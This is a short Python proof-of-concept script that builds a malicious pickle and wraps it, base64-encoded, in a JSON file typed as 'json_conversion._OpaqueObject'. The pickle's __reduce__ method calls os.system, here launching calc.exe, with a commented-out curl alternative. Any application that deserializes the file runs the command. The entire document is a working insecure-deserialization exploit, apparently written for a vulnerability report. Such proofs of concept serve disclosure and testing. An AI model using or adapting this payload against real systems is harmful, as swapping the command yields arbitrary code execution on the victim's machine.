import base64
import pickle
import json
import os

class Blah:
    def __reduce__(self):
        # When deserialized, this will execute a curl command
        # return (os.system, ("curl -I http://localhost:1234/",))
        return (os.system, ("calc.exe",))


def generate_opaque_json_file(output_filename='poc.json'):
    # Create instance of the payload class
    obj_to_serialize = Blah()

    # Serialize and encode as base64
    encoded = base64.encodebytes(pickle.dumps(obj_to_serialize)).decode('utf-8')

    # JSON structure compatible with json_conversion._OpaqueObject
    obj = {
        "_type": "json_conversion._OpaqueObject",
        "value": encoded
    }

    # Write to file
    with open(output_filename, 'w') as f:
        json.dump(obj, f, indent=2)

if __name__ == '__main__':
    generate_opaque_json_file()
